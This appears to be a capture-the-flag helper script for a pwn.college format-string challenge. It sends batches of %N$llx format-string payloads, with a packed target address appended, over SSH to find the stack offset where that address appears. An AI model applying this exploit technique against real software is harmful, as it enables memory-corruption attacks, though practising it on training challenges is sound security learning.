import subprocess
import struct

ADDR = 0x404100

import os

BASE = int(os.getenv("BASE", "1"))
LIMIT = int(os.getenv("LIMIT", "200"))
SSH_CMD = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.0",
]

for start in range(BASE, BASE + LIMIT, 10):
    specs = " ".join("%{}$llx".format(i) for i in range(start, start + 10))
    fmt = f"R{start}:{specs}"
    payload = fmt.encode() + struct.pack("<Q", ADDR)
    res = subprocess.run(
        SSH_CMD, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
    )
    out = res.stdout.decode("latin-1", errors="ignore")
    marker_line = None
    for line in out.splitlines():
        if line.startswith("R"):
            marker_line = line
            break
    if marker_line and "404100" in marker_line:
        print("range", start, "hit")
        print(marker_line)
        break
    else:
        print("range", start, "no hit")
